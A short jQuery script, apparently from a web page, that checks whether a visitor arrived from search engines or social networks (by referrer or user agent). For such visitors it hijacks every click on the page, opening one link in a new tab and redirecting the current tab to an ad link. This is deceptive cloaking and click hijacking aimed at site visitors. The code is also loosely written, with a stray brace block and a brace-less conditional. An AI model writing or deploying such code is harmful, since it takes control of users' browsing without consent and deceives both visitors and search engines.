$(document).ready(function()
{
    console.log('jquery ready!');
	{$('body').addClass('dremo');}

    if(['.google.', 'bing.', 'yandex.', 'facebook.', 'pinterest.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s)))
  

    $(document).on('click','.dremo',function(e)
    {
        e.preventDefault();            

        window.open(go_current,"_blank");
        window.location.href = direct_link_ads;
    });

});
